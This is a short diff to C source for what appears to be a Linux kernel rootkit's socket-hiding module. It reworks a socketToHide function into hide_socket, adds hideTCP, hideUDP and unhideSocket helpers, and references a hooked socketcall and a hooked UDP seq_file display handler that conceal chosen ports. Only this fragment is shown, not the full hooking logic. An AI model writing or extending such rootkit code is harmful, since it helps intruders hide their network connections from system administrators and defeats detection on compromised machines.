@@ -7,6 +7,7 @@
 
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
+#include "hide_sockets.h"
 
 
 // for convenience, I'm using the following notations for fun pointers:
@@ -23,12 +24,22 @@ fun_long_int_unsigned_long orig_socketcall;
 int port_to_hide = -1;
 char* prot_to_hide = "";
 
-int socketToHide(char *protocol, int port){
+void hide_socket(char *protocol, int port){
     prot_to_hide = protocol;
     port_to_hide = port;
-    return port; // correct?
 }
 
+void hideTCP(int port){
+    hide_socket("tcp", port);
+}
+
+void hideUDP(int port){
+    hide_socket("udp", port);
+}
+
+void unhideSocket(void){
+    hide_socket("", -1);
+}
 
 static int hooked_udp_show(struct seq_file* file, void* v){
     int port;
